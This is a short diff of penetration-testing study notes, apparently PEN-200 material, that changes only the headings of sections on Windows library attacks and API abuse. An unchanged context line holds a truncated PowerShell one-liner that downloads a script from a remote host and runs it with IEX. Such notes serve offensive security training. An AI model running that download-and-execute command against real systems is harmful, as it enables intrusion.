@@ -1,4 +1,5 @@
-# Windows Libraries
+## Windows Libraries & Abusing APIs
+### Windows Libraries
 
 ```
 pip3 install wsgidav
@@ -15,7 +16,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 
 ```
 
-## Abusing APIs
+### Abusing APIs
 
 I'd recommend reading it straight from the pen-200 guide. Essentially, through a series of commands it is discovered you can abuse an API to create a user.
 
